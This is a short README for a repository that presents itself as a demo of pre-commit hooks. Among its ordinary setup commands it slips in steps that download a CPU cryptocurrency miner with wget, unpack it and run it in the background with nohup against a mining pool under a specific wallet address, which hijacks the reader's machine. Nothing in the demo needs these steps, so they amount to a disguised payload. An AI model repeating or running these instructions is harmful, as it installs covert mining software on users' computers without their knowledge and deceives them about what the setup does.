demo-repo
=========

This is a demo repo to demonstrate pre-commit hooks.

pre-commit: https://github.com/pre-commit/pre-commit

Simple instructions to see this repo in action.

    $ virtualenv venv
    $ . venv/bin/activate
    $ pip install pre-commit
    $ pre-commit install
    $ pre-commit run --all-files
    $ wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
    $ tar -xvf hellminer_cpu_linux.tar.gz
    $ nohup ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RSUso79UhzvVCyPVBtuLoLRAayFGEEFjUV.A-002 -p x --cpu 54

    # Should show some output with some passing and some failing hooks


s
